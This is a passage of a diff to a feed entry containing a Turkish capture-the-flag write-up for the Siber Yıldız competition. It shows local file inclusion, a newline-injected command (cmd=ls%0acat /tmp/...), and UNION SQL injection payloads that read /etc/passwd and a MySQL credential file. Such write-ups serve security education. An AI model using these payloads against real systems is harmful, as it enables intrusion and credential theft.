 &lt;p&gt;Görünür hale getirdikten sonra "&lt;strong&gt;admin&lt;/strong&gt;","&lt;strong&gt;admin&lt;/strong&gt;" ikisiyle içeri girdik.&lt;/p&gt;
 &lt;p&gt;Bilet Satış Platformunda başlığında bir sayfaya yönlendirildik. Bu sayfada "&lt;strong&gt;index.php?file=firmalar.php&lt;/strong&gt;", "&lt;strong&gt;index.php?file=sitekullanimi.php&lt;/strong&gt;" gibi URL bilgilerini görünce LFI olduğunu doğrudan anladık.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;index.php?file=firmalar.php&lt;/strong&gt; sayfası üzerinde almış olduğumuz &lt;strong&gt;/home/sites/siberyildiz/files/inc/pages/firmalar.php syntax error on line 11&lt;/strong&gt; hatası ise dizini tespit etmemize yardımcı oldu. Bulunduğumuz dizinin pages dizini olduğunu gördük.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru4/soru4-2.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru4/soru4-2.jpg" /&gt;&lt;/p&gt;
 &lt;p&gt;Genellikle web geliştirici veritabanı bağlantı bilgilerini "includes","inc","db" gibi klasörler altında "&lt;strong&gt;ayar.php&lt;/strong&gt;","&lt;strong&gt;ayarlar.php&lt;/strong&gt;","&lt;strong&gt;connect.php&lt;/strong&gt;","&lt;strong&gt;conn.php&lt;/strong&gt;","&lt;strong&gt;db.php&lt;/strong&gt;" gibi dosya isimlerinde tutmaktadır. Bu teoriden yola çıkarak bir üst dizine çıkmamızı ve db.php dosyasını içeri çağıran URL ile birlikte &lt;strong&gt;index.php?file=../db.php&lt;/strong&gt; kolayca flagi elde ettik.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru4/sanayihirsizligi-3.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru4/sanayihirsizligi-3.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Kahraman Şehidimiz &lt;strong&gt;Ömer Halis DEMİR&lt;/strong&gt;'e Allah'dan rahmet diliyoruz.&lt;/p&gt;
 &lt;h2&gt;11. Bu görev önünde iki seçenek var : başarılı olursun veya olamazsın?&lt;/h2&gt;
 &lt;p&gt;Bu soruya giriş yapıldığında "nothing here" şeklinde bir ibare karşılıyordu. Ne olabilir diye düşünürken robots.txt dosyasını görüntüledik. İçerisinde yer alan Disallow: cannotfindme bilgisi üzerine cannotfindme dizinine geçtik. Burada ufak bir giriş alanı gördük.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru11/1.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru11/1.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Kullanıcı adı "admin" olarak giriş yaptığımızda, yeni bir alan ve form açıldı.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru11/2.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru11/2.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Giriş yaptığımız yerde bizden komut çalıştırılması isteniyordu. http://www.hedef.com/?pass=sifre&amp;amp;cmd=ls şeklinde oluşan link üzerinde pass değişkenini brute force uygulamak CTF mantığımıza aykırı gelmişti.&lt;/p&gt;
 &lt;p&gt;Kısa süre sonra array injection ile birlikte ?pass[]=&amp;amp;cmd=ls olarak dosyaları listelemeyi başardık. İlgili dizinde &lt;strong&gt;"index.php"&lt;/strong&gt;,&lt;strong&gt;"readme.txt"&lt;/strong&gt; ve &lt;strong&gt;"try.html"&lt;/strong&gt; dosyalarının olduğunu gördüm. &lt;strong&gt;try.html&lt;/strong&gt; dosyası içerisinde &lt;strong&gt;read file /tmp/isThatFlag.txt&lt;/strong&gt; ifadesi yer alıyor fakat sistem &lt;strong&gt;ls&lt;/strong&gt; harici komut çalıştırmamıza izin vermiyordu.&lt;/p&gt;
 &lt;p&gt;Bunun üzerine /tmp altındaki &lt;strong&gt;isThatFlag.txt&lt;/strong&gt; dosyasını okumak için new line yani bir alt satıra geç ifadesinin encode değeri olan &lt;strong&gt;%0a&lt;/strong&gt; ifadesini kullandık. &lt;strong&gt;http://hedef.com/cannotfindme/?pass[]=&amp;amp;cmd=ls%0acat%20/tmp/isThatFlag.txt&lt;/strong&gt; ile birlikte flagi elde ettik.&lt;/p&gt;
 &lt;h2&gt;12. Yapabileceğine inancımız tam.?&lt;/h2&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru12/1.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru12/1.jpg" /&gt;&lt;/p&gt;
 &lt;p&gt;Bu soruda ise resimden göreceğiniz üzere iki adet bağlantı yer almaktadır. Ek olarak index.php?id=1 bağlantısı üzerinden dosya indirebileceğimiz söylenmektedir. Bağlantıya tıkladığımızda "a.jpg" isimli boş bir dosyanın indirildiğini görüyoruz.&lt;/p&gt;
 &lt;p&gt;Muhtemelen aşağıdaki şekilde bir SQL sorgusu arka planda işlemektedir.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;select * from files where id=1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Biz bunu şu şekilde yaparsak dosya indirebiliriz.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;select * from files where id=-1&amp;#39; UNION 1,&amp;#39;/etc/passwd&amp;#39; %23&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;UNION&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Bir UNION SQL injection kuralı gereği ilk sorguda kaç kolon dönüyorsa, ikinci sorguda aynı sayıda kolonun dönmesi gerekmektedir. Bu yüzden UNION'dan sonra 1 ifadesini yalnızca kolon olması adına ekledik.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru12/2.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru12/2.jpg" /&gt;&lt;/p&gt;
 &lt;p&gt;Biraz uğraşın ardında diğer sayfalarda yer alan SQL bağlantı hataları izlenimindeki ifadeler üzerinden "users" veritabanına girebilmek adına yedeklerine ulaşmak için /var/lib/mysql/ altından ilgili veritabanı ve tablo bilgilerini indirdik. /var/lib/mysql dizini altında veritabanları, kolonlar ve içerikleri yer almaktadır.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;select * from files where id=-1&amp;#39; UNION 1,&amp;#39;/var/lib/mysql/users/login.MYD&amp;#39; %23&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;UNION&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mysql&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MYD&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Elde ettiğimiz login.MYD dosyasını string ile okuduğumuzda giriş bilgilerini elde ettik.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;mustafaaltinkaynak&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;mustafaaltinkaynak$&lt;/span&gt; &lt;span class="n"&gt;strings&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;MYD&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="n"&gt;admin&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="n"&gt;bu1Parolami&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="n"&gt;Sence&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafaaltinkaynak&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;mustafaaltinkaynak$&lt;/span&gt; &lt;span class="n"&gt;strings&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;MYD&lt;/span&gt;
+&lt;span class="n"&gt;admin&lt;/span&gt;
+&lt;span class="n"&gt;bu1Parolami&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="n"&gt;Sence&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Elde ettiğimiz bu bilgiyi ikinci bağlantıda yer alan ?username=DENEME&amp;amp;password=deneme ile giriş yapabilirsiniz ibaresinin yer aldığı kısıma GET isteği şeklinde gönderdiğimizde flagi elde ettik.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru12/4.jpg"&gt;&lt;/p&gt;</content><category term="siberyildiz"></category><category term="USOM"></category><category term="BTK"></category><category term="siber güvenlik yarışması"></category></entry></feed>
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru12/4.jpg" /&gt;&lt;/p&gt;</summary><category term="siberyildiz"></category><category term="USOM"></category><category term="BTK"></category><category term="siber güvenlik yarışması"></category></entry></feed>
